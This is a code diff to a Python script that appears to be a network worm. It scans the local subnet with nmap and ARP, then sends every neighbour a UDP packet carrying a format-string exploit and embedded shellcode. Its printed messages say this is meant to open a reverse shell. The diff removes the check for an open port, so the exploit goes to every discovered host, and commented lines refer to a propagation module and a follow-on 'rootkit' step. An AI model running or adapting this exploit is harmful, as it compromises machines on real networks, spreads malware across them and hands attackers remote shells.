@@ -11,6 +11,7 @@ import struct
 import socket
 import netifaces as ni
 import subprocess
+import ipaddress
 import re
 
 # Function to check if a port is open on a given IP
@@ -25,6 +26,15 @@ def is_port_open(ip, port):
     finally:
         sock.close()
 
+def ping_sweep(network):
+    # Run nmap for a ping sweep
+    try:
+        output = subprocess.check_output(['nmap', '-sn', network], text=True)
+        return output
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while running nmap: {e.output}")
+        return ""
+
 # Function to get the network and subnet mask of the primary interface
 def get_interface():
     gateways = ni.gateways()
@@ -33,9 +43,14 @@ def get_interface():
     return interface
 
 def get_arp_neighbors(interface):
+    # Get the network details
+    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
+    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
+    network_str = str(network)
+    # Perform a ping sweep to populate the ARP table
+    ping_sweep(network_str)
     # Execute the arp command and get the output
     arp_output = subprocess.check_output(['arp', '-a'], text=True)
-
     # Initialize an empty list to hold the neighbor IPs
     neighbors = []
 
@@ -104,7 +119,12 @@ shellcode += b"\xa0\xef\xec\x5f\xd4\xda\x02\x8c\xa3\xba\x9b"
 shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
 shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"
 
-# Example usage
+#def run():
+#    next_action = ""
+#    data = ""
+#    print("[+] Propagation module activated...")
+
+
 try:
     interface = get_interface()
     port = 50001  # Define the port to scan
@@ -112,26 +132,17 @@ try:
     print(neighbors)
 
     for ip in neighbors:
-        if is_port_open(ip, port):
-            print(f"IP: {ip}, Port: {port} is open.")
-            print('sending payload ...')
-            p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(p, (ip, port))
-            s.close()
-            print('reverse shell should connect within 5 seconds')
-        else:
-            print(f"IP: {ip}, Port: {port} is not open.")
+        print(f"IP: {ip}, Port: {port} is open.")
+        print('sending payload ...')
+        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(p, (ip, port))
+        s.close()
+        print('reverse shell should connect within 5 seconds')
+        
 except Exception as e:
     print(f"An error occurred: {e}")
     exit()
 
-   
-           
-#def run():
-#    next_action = ""
-#    data = ""
-#    print("[+] Propagation module activated...")
-#
 #    next_action = "rootkit"
 #    return data, next_action
